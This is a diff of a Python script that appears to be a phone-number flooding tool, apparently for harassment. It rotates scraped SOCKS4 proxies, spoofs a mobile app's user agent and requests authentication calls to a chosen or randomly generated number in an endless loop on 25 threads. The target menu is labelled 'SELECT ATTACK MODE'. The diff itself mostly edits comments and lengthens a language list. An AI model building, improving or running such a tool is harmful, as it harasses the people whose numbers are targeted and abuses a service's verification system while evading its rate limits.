@@ -35,11 +35,10 @@ def generate_unique_ids():
     unique_uuid = uuid.uuid4()
     return timestamp, random_id, unique_uuid
 
-# --- Auto-fetch internal proxies function ---
+# --- Auto-fetch internal proxies function (No deletion) ---
 def fetch_internal_proxies():
     internal_proxies = []
     try:
-        # Fetching socks4 proxies for quality
         response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all", timeout=10)
         if response.status_code == 200:
             lines = response.text.splitlines()
@@ -109,6 +108,7 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
+# --- Target Selection Menu (English) ---
 def get_target_info():
     print(colored("\n[ SELECT ATTACK MODE ]", "yellow", attrs=["bold"]))
     print("1 - Manual Entry (Iraq/Global)")
@@ -133,10 +133,9 @@ def worker_task(country_code, number, proxies_list, foreign_langs):
     headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
 
     while True:
-        # Generate random number if mode is RANDOM
         current_num = number
         if number == "RANDOM":
-            current_num = "".join(random.choices(string.digits, k=9)) # Fast random 9 digits
+            current_num = "".join(random.choices(string.digits, k=9)) # Super fast random digits
 
         foxx, fox, foxer = generate_unique_ids()
         random_android_version = str(random.randint(7, 14))
@@ -172,14 +171,13 @@ if __name__ == "__main__":
 
     country_code, number = get_target_info()
     
-    # Keeping your massive language list intact (No deletion)
-    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi"] # ... (Full list remains in memory)
+    # Original language list remains intact
+    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu", "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu", "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af", "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk", "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm", "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady", "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar", "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch", "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv", "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo", "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got", "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo", "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr", "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz", "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc", "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn", "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam", "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug", "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn", "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm", "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te", "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty", "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo", "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan", "zh-yue", "zu"]
 
     proxies_list = load_proxies("gx1gx1.txt")
     
-    print(colored("\n[*] Launching attack with maximum speed and auto-rotation...", "yellow"))
+    print(colored("\n[*] Starting attack with max speed (25 Threads)...", "yellow"))
     
-    # Running with 25 threads for higher speed
     with ThreadPoolExecutor(max_workers=25) as executor:
         for _ in range(25):
             executor.submit(worker_task, country_code, number, proxies_list, foreign_langs)
